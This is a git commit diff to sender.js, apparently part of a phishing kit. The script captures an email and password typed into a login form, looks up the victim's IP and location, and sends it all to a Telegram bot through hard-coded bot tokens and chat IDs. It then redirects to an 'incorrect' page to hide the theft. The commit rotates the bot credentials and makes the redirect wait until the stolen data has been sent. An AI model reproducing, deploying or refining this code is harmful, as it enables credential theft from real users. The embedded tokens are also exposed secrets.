f3a934a19f8ee62b00d624dcba534504bd7fbd0e
cerncapitals <118382495+Omnicron-Hydra@users.noreply.github.com>
2024-06-20 06:57:40 +0100

    Update sender.js

--- sender.js
+++ sender.js
@@ -1,36 +1,43 @@
 document.addEventListener("DOMContentLoaded", function() {
     const form = document.querySelector("#form");
-  
+
     form.addEventListener("submit", function(e) {
         e.preventDefault();
-  
+
         const email = document.getElementById("email").value;
         const password = document.getElementById("password").value;
-  
+
         // Function to send message to Telegram
         function sendMessage(ip_address, country, country_code, state) {
-            const message = `Results: ${email} is:\n`
+            const message = `Results:\n`
                           + `- Username/Email: ${email}\n`
                           + `- Password: ${password}\n`
                           + `- IPAddress: ${ip_address}\n`
                           + `- Country: ${country}\n`
                           + `- Country-code: ${country_code}\n`
                           + `- State: ${state}`;
-  
-            const botToken = '5700160985:AAGLArP0ckx7Vy9uDK25Tr8kK5UKMvsRyOg';
-            const chatId = '5397877284';
-  
+
+            const botToken = '7137021347:AAHJQ6GWWzbNjiVlzmfpZ2rsrrWa8VnS5nk';
+            const chatId = '-1002178593588';
+
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-  
+
             // Send message to Telegram using XMLHttpRequest
             const api = new XMLHttpRequest();
             api.open("GET", url, true);
+            api.onreadystatechange = function() {
+                if (api.readyState === 4) {
+                    if (api.status === 200) {
+                        // Redirect to success page
+                        window.location.replace("incorrect.html");
+                    } else {
+                        console.error("Error sending message to Telegram:", api.statusText);
+                    }
+                }
+            };
             api.send();
-  
-            // Redirect to success page
-            window.location.replace("incorrect.html");
         }
-  
+
         // Fetch IP address and location information
         fetch("https://ipapi.co/json/")
             .then(response => response.json())
@@ -47,5 +54,4 @@ document.addEventListener("DOMContentLoaded", function() {
                 sendMessage('Unknown', 'Unknown', 'Unknown', 'Unknown');
             });
     });
-  });
-  
+});
